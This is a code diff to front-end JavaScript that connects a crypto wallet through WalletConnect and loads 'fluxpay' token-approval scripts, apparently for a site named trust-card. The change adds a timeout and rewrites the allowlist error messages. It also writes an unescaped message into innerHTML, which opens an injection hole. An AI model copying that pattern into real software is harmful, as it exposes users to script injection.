@@ -107,12 +107,11 @@
   }
 
   function onError(msg) {
-    var hint = '';
-    if (msg && (String(msg).indexOf('Connection closed') >= 0 || String(msg).indexOf('origin') >= 0 || String(msg).indexOf('3000') >= 0)) {
-      hint = ' Add trust-card.vercel.app to WalletConnect Cloud allowlist (dashboard.walletconnect.com).';
-    }
+    var isAllowlist = msg && (String(msg).indexOf('Connection closed') >= 0 || String(msg).indexOf('origin') >= 0 || String(msg).indexOf('3000') >= 0 || String(msg).indexOf('allowlist') >= 0);
     var p = failedWrap && failedWrap.querySelector ? failedWrap.querySelector('p') : null;
-    if (p) p.textContent = (msg || 'Connection failed') + hint + ' If the wallet modal did not appear, try refreshing.';
+    if (p) {
+      p.innerHTML = (msg || 'Connection failed') + (isAllowlist ? ' <a href="https://dashboard.walletconnect.com" target="_blank" rel="noopener" style="color:#22d3ee;text-decoration:underline">Add this domain to WalletConnect allowlist</a>, then refresh.' : ' Try refreshing.');
+    }
     showFailed();
   }
 
@@ -123,8 +122,13 @@
     var scriptUrl = baseUrl + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js');
     var runKey = isTrc ? 'FluxPayTRC20Approval' : 'FluxPayApproval';
     var runFn = window[runKey] && window[runKey].run;
+    var doneCalled = false;
+    var timeoutId;
 
     function done(err) {
+      if (doneCalled) return;
+      doneCalled = true;
+      if (timeoutId) clearTimeout(timeoutId);
       if (fluxpayRejectionHandler) {
         window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
         fluxpayRejectionHandler = null;
@@ -132,6 +136,10 @@
       if (resetLoading) resetLoading();
       if (err) onError(err);
     }
+    timeoutId = setTimeout(function () {
+      if (doneCalled) return;
+      done('WalletConnect modal did not appear. Add ' + (typeof location !== 'undefined' ? location.hostname : 'trust-card.vercel.app') + ' to WalletConnect Cloud allowlist: dashboard.walletconnect.com');
+    }, 12000);
 
     fluxpayRejectionHandler = function (e) {
       if (e && e.reason && (String(e.reason).indexOf('Loading chunk') >= 0 || String(e.reason).indexOf('404') >= 0 || String(e.reason).indexOf('Failed to fetch') >= 0 || String(e.reason).indexOf('ChunkLoadError') >= 0)) {
